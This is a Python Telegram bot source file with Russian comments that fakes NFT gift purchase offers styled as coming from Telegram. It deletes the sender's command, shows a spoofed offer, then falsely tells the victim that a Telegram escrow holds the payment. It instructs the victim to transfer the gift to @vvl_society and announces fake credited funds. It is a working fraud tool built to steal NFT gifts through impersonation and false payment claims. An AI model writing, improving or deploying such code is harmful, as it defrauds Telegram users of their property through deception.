import asyncio
import logging
import os
import re
from aiohttp import web
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardButton, CallbackQuery
from aiogram.utils.keyboard import InlineKeyboardBuilder

BOT_TOKEN = os.environ.get("BOT_TOKEN")

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

active_deals = {}


# --- Функция: разбор ссылки NFT ---
def parse_nft_link(url):
    """
    Из https://t.me/nft/SnoopDogg-9203 делает:
    name = "SnoopDogg"  (без пробелов, как в ссылке)
    number = "9203"
    full = "SnoopDogg #9203"
    """
    match = re.search(r"t\.me/nft/([A-Za-z0-9_]+)-(\d+)", url)
    if not match:
        return None

    name = match.group(1)     # "SnoopDogg"
    number = match.group(2)   # "9203"

    return {
        "name": name,
        "number": number,
        "full": f"{name} #{number}",   # "SnoopDogg #9203"
        "url": url
    }

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    await message.answer("Бот работает. Версия 2.")
# --- Команда /buy ---
@dp.message(Command("buy"))
async def cmd_buy(message: types.Message):
    # Удаляем сообщение пользователя
    try:
        await message.delete()
    except Exception as e:
        logging.warning(f"Не удалось удалить сообщение: {e}")

    args = message.text.split()

    if len(args) < 4:
        await message.answer(
            "⚠️ Использование: `/buy <ссылка_на_NFT> <сумма> <валюта>`\n"
            "Пример: `/buy https://t.me/nft/SnoopDogg-9203 1000 STARS`"
        )
        return

    nft_link = args[1]
    amount = args[2]
    currency = args[3].upper()

    nft_data = parse_nft_link(nft_link)

    if not nft_data:
        await message.answer(
            "⚠️ Неверная ссылка на NFT.\n"
            "Правильный формат: `https://t.me/nft/Название-Номер`\n"
            "Пример: `https://t.me/nft/SnoopDogg-9203`"
        )
        return

    nft_title = nft_data["full"]   # "SnoopDogg #9203"

    # ⚠️ ВАЖНО: ссылку пишем ГОЛОЙ (без <a href>), чтобы Telegram
    # показал виджет-превью с картинкой NFT
    text = (
        f"<b>Telegram</b>\n"
        f"<b>{nft_title}</b>\n\n"
        f"Пользователь предлагает вам\n"
        f"<b>{amount} {currency}</b> за подарок {nft_link}.\n\n"
        f"Оффер действителен ещё 6 ч. 0 мин."
    )

    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text="❌ Отклонить", callback_data=f"decline_{message.from_user.id}"),
        InlineKeyboardButton(text="✅ ТЕЕЕЕСТПринять", callback_data=f"accept_{message.from_user.id}")
    )

    deal_id = str(message.from_user.id)
    active_deals[deal_id] = {
        "link": nft_link,
        "amount": amount,
        "currency": currency,
        "title": nft_title
    }

    # disable_web_page_preview=False — чтобы Telegram показал виджет с картинкой
    await message.answer(
        text=text,
        reply_markup=builder.as_markup(),
        parse_mode="HTML",
        disable_web_page_preview=False
    )


# --- Отклонить ---
@dp.callback_query(F.data.startswith("decline_"))
async def process_decline(callback: CallbackQuery):
    await callback.message.edit_text("❌ Предложение отклонено")
    await callback.answer()


# --- Принять ---
@dp.callback_query(F.data.startswith("accept_"))
async def process_accept(callback: CallbackQuery):
    await callback.answer(
        text="Внимание!\n\nСледуйте инструкции, чтобы не потерять подарок и получить оплату.\n\nНажмите «ОК», если вы прочитали это сообщение.",
        show_alert=True
    )
    await asyncio.sleep(1.5)

    deal_id = callback.data.split("_")[1]
    deal = active_deals.get(deal_id)
    if not deal:
        await callback.message.edit_text("⚠️ Ошибка: данные о сделке утеряны.")
        return

    nft_title = deal["title"]
    nft_url = deal["link"]

    # Опять же — «голая» ссылка, чтобы Telegram показал превью
    final_text = (
        f"<b>NFT Deal</b>\n\n"
        f"Ордер #TG-D721BSTP\n\n"
        f"Покупатель зарезервировал test <b>{deal['amount']} {deal['currency']}</b> "
        f"через эскроу-систему Telegram.\n"
        f"Средства хранятся на специальном эскроу-счёте и будут автоматически "
        f"зачислены на ваш баланс Telegram Stars сразу после передачи подарка.\n\n"
        f"<b>Инструкция для завершения сделки:</b>\n"
        f"1. Передайте подарок пользователю: @vvl_society\n"
        f"2. Нажмите «Передать NFT» и выберите <b>{nft_title}</b>\n"
        f"3. Подтвердите передачу подарка.\n\n"
        f"Ссылка на подарок: {nft_url}\n\n"
        f"Telegram зафиксирует транзакцию и моментально зачислит "
        f"{deal['amount']} {deal['currency']} на ваш баланс. Резерв действует 24 часа."
    )

    builder = InlineKeyboardBuilder()
    builder.row(
        InlineKeyboardButton(text="Передать NFT", url=nft_url)
    )
    builder.row(
        InlineKeyboardButton(text="Подтвердить передачу", callback_data=f"confirm_{deal_id}")
    )

    await callback.message.edit_text(
        text=final_text,
        reply_markup=builder.as_markup(),
        parse_mode="HTML",
        disable_web_page_preview=False
    )


# --- Подтвердить передачу ---
@dp.callback_query(F.data.startswith("confirm_"))
async def process_confirm(callback: CallbackQuery):
    await callback.answer("✅ Транзакция подтверждена!", show_alert=True)
    await callback.message.edit_text("✅ Сделка завершена. Средства зачислены на ваш баланс.")


# --- Веб-сервер для Render ---
async def handle(request):
    return web.Response(text="Bot is alive!")


async def main():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', int(os.environ.get("PORT", 8080)))
    await site.start()

    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())